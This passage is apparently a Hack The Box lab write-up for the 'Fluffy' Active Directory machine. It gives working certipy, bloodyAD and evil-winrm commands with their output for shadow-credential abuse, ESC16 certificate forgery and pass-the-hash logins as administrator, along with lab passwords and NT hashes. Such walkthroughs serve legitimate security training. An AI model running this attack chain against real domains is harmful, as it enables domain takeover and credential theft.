24f4b9c0c08869bddd8d013decc98253ba4e0872fa6e71c4d7200fd18cb11a9b358da2
```
we got a hashes related to service tickets (TGS), one for `ca_svc` and one for `winrm_svc`

### Attempting to crack hashes

Unfortunately when running hashcat like this: 
```shell
hashcat -m 13100 hash.txt rockyou.txt --force
```
the hashes appeared to be uncrackable! This means either the password is too complex, or we are using wrong cracking configuration. We must find another way....

## Bloodhound as p.agila

We can also use bloodhound to see the bigger picture:
```shell
bloodhound-python -u 'p.agila' -p 'prometheusx-303'  -d fluffy.htb -ns 10.10.11.69 -c All --zip
```

First, found the group membership of p.agila
![Pasted image 20250604004457](MediaFiles/Pasted%20image%2020250604004457.png)

lets inspect the service account managers: (outbound object control)
![Pasted image 20250604004719](MediaFiles/Pasted%20image%2020250604004719.png)

lets now inspect service accounts: (outbound object control)
![Pasted image 20250604004819](MediaFiles/Pasted%20image%2020250604004819.png)
this group has  `GenericWrite` permissions over those service accounts

lets also see Group membership for each one of those service accounts
- ldap_svc
![Pasted image 20250604005109](MediaFiles/Pasted%20image%2020250604005109.png)
- winrm_svc
![Pasted image 20250604005136](MediaFiles/Pasted%20image%2020250604005136.png)
- ca_svc
![Pasted image 20250604005032](MediaFiles/Pasted%20image%2020250604005032.png)
hm, we see cert publishers here.. seems interesting

So this will be our path, targeting cert_publishers

## Add user to group

First `p.agila`add it to the SERVICE ACCOUNTS group
```bash
bloodyAD --host '10.10.11.69' -d 'dc01.fluffy.htb' -u 'p.agila' -p 'prometheusx-303'  add groupMember 'SERVICE ACCOUNTS' p.agila
```
output
```
[+] p.agila added to SERVICE ACCOUNTS
```
okay we added the user to SERVICE ACCOUNTS, but whats next?

Lets remember the outbound object control of SERVICE ACCOUNTS:
![Pasted image 20250604004819](MediaFiles/Pasted%20image%2020250604004819.png)
it has `GenericWrite` over those 3 users, what can we do with it?

This one helped me choose what to do next: [https://www.thehacker.recipes/ad/movement/dacl/](https://www.thehacker.recipes/ad/movement/dacl/ "https://www.thehacker.recipes/ad/movement/dacl/")
##### How to take advantage of GenericWrite ?

**GenericWrite** privilege can do the following :
- Allows modification a multitude of target object's attributes. For example certificate/key related attributes such as `msDS-KeyCredentialLink`.
- Adding entries to `msDS-KeyCredentialLink` is precisely how **shadow credentials** are stored in AD (public-key blobs / KeyCredential objects).
- Therefore an identity with GenericWrite can add a KeyCredential (public key) to a service account object, enabling a holder of the private key to authenticate as that service account 
Put another way: GenericWrite → ability to change key/certificate attributes → ability to add KeyCredential entries → attacker can authenticate with a private key as the target account = **shadow cred** capability.

##### What are shadow credentials ?

Shadow credentials are **certificate-based credentials** that get attached to an Active Directory account so that the holder of the corresponding private key can authenticate as that account — without ever knowing the account’s password.

Technically they show up in AD as entries under attributes like `msDS-KeyCredentialLink` / KeyCredential objects (a “key credential” / public key blob tied to the object). Windows accepts those key entries for certain auth flows (e.g. certificate-based authentication / certificate logon, WinRM / Negotiate if configured, ADFS/OAuth flows in some deployments), so if you can add such a key to an account, you can ==impersonate== it using the private key — password not required.

## Adding Shadow Credential

### Towards WINRM_SVC

lets sync with the machine's dc
```shell
ntpdate fluffy.htn
```
then
```bash
certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303'  -account 'WINRM_SVC'  -dc-ip '10.10.11.69'
```
output:
```shell
└─# certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303'  -account 'WINRM_SVC'  -dc-ip '10.10.11.69'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '688de985-f73a-14b9-884e-33a1d3158056'
[*] Adding Key Credential with device ID '688de985-f73a-14b9-884e-33a1d3158056' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID '688de985-f73a-14b9-884e-33a1d3158056' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Using principal: winrm_svc@fluffy.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
```
great! now lets login to `winrm_svc` with this hash `33bd09dcd697600edf6b3a7af4875767`
```bash
evil-winrm -i 10.10.11.69 -u 'winrm_svc' -H '33bd09dcd697600edf6b3a7af4875767'
```
and grab the user flag!
```shell
84f38474ff40ababe763e4ec474cd157
```

### Towards CA_SVC

Similarly, since we have `GenericWrite` towards ca_svc too, lets get NT hash for `ca_svc` too, and we will see later how it will be used:
```shell
certipy shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account ca_svc
```
(the output here is similar to winrm_svc, its snipped)
```
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
```

# Privesc

Since `ca_svc` user exists, this signals the presence of certificate authority, so lets find out more about it by identifying vulnerable certificates first:
## Searching for vulnerable certificates

By using certipy i am going to search whether there are vulnerable certs present
```bash
certipy-ad find -vulnerable -u CA_SVC -hashes ":ca0f4f9e9eb8a092addf53bb03fc98c8" -dc-ip 10.10.11.69
```
found no templates, but lets update certipy to latest version and try again
```shell
certipy-ad find -vulnerable -u CA_SVC -hashes ":ca0f4f9e9eb8a092addf53bb03fc98c8" -dc-ip 10.10.11.69
```
output:
```bash
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20250529120822_Certipy.txt'
[*] Wrote text output to '20250529120822_Certipy.txt'
[*] Saving JSON output to '20250529120822_Certipy.json'
[*] Wrote JSON output to '20250529120822_Certipy.json'

cat 20250529120822_Certipy.txt 
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates
```
There is `ESC16` vulnerability! 

## Exploiting ESC16

#### **1 : Read the original UPN of the victim account (optional - for recovery).**
```bash
certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -user 'ca_svc' read
```
output
```shell
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'ca_svc':
    cn                                  : certificate authority service
    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
    name                                : certificate authority service
    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
    sAMAccountName                      : ca_svc
    servicePrincipalName                : ADCS/ca.fluffy.htb
```

#### **2: Update the victim account’s UPN to that of the target administrator `sAMAccountName`.**
```shell
certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69'  -upn 'administrator'  -user 'ca_svc' update
```
output
```shell
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'
```
#### **3: Request a certificate issued as the "victim" user from any appropriate client authentication template* (e.g., "user") on the CA vulnerable to ESC16**
```bash
certipy-ad shadow -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -account 'ca_svc' auto
```
output:
```shell
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'd6fa2c18-58bb-8509-b2f8-6eca381c72c2'
[*] Adding Key Credential with device ID 'd6fa2c18-58bb-8509-b2f8-6eca381c72c2' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID 'd6fa2c18-58bb-8509-b2f8-6eca381c72c2' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Using principal: ca_svc@fluffy.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
```
According to this snippet of the above output:
```
[*] Saved credential cache to 'ca_svc.ccache'
```
we should tell kerberos to use this credential `ca_svc.ccache`:
```bash
export KRB5CCNAME=ca_svc.ccache 
```

#### **4. Request a certificate
```bash
certipy-ad req -k -dc-ip '10.10.11.69' -target 'DC01.FLUFFY.HTB' -ca 'fluffy-DC01-CA' -template 'User'
```
output:
```shell
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 16
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'         
```
(keep in mind sometimes you need to rerun the commands or even sync with the domain again, there can be network errors)

#### **5 : Restore the UPN of the "victim" account.**
```bash
certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
```
output
```shell
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc@fluffy.htb
[*] Successfully updated 'ca_svc'
```

#### **6 : Authenticate as the target administrator.**
```bash
certipy-ad auth -dc-ip '10.10.11.69' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'
```
output
```shell
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@fluffy.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```
we got hash!
```shell
aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```
grab the 2nd part and login with winrm
```shell
evil-winrm -i fluffy.htb -u 'administrator' -H '8da83a3fa618b6e3a00e93f676c92a6e'
```
got the root flag!
```shell
ca48648c7b02dd108e61dda67896f5b7
```

---------
# Summary

Here is the list of the steps simplified, per phase, for future reference and for quick reading: 
## Reconnaissance

1. Add host to `/etc/hosts` and run `nmap -sV -Pn` → AD ports (DNS, Kerberos, LDAP, SMB, WinRM) and host identified as `DC01`.
2. Correlated provided creds against services (SMB/LDAP) — `j.fleischman` works for SMB; 
3. Enumerated SMB shares.
4. Inspected `IT` share → download `Upgrade_Notice.pdf`, `Everything`, `KeePass` archive; `Upgrade_Notice.pdf` flags CVE-2025-24071 (`.library-ms` ZIP → SMB auth leak).
5. Decide exploit vector: target CVE-2025-24071 via crafted ZIP upload to `IT` to trigger NTLM auth capture.

## Foothold

1. Create PoC `exploit.zip` for CVE-2025-24071 and upload to `//fluffy.htb/IT` via `smbclient`.
2. Run `responder` locally to capture incoming NTLM auths; capture NTLMv2 from `p.agila`.
3. Crack captured NTLMv2 with `john` → `p.agila:prometheusx-303`.
4. Validate `p.agila` credentials against SMB/LDAP and continue enumeration from that account.
5. Enumerate domain users/groups via `crackmapexec`/LDAP — find `ca_svc`, `ldap_svc`, `winrm_svc`, `Cert Publishers`, `Service Accounts`, etc.
6. Dump SPNs with `GetUserSPNs.py` → collect TGS hashes for `ca_svc`, `ldap_svc`, `winrm_svc`; 
7. Hashcracking attempts failed, had to find another way
8. Run BloodHound as `p.agila` → discovered outbound `GenericWrite`/owner-style control from service-account-managing groups over `ca_svc` and other service accounts; `ca_svc` is in `Cert Publishers` (ADCS path identified).

## Privesc
1. Use `GenericWrite`/owner control findings to modify/abuse `ca_svc` (or set owner) so the service account can be used for cert enrollment or shadow creds.
2. Enumerate ADCS templates and request a cert using the service account context (certipy-like workflow) against a vulnerable template that permits high-privilege UPN enrollment.
3. Extract auth from the returned certificate (`.pfx`) or retrieve shadow credentials / NT hash for `ca_svc`
4. Use the cert/hash to authenticate as a privileged account (Administrator) via certificate or hash-based login (e.g., `evil-winrm -u administrator -H <hash>` or cert auth).

-----------
# Sidenotes

This one was a classic yet challenging easy AD related box that did not dissaspoint. The techniques showed here are definitely worth revisiting in the future, especially for machines related to certificates. 

https://www.hackthebox.com/achievement/machine/284567/662
![Pasted image 20250604013347](MediaFiles/Pasted%20image%2020250604013347.png)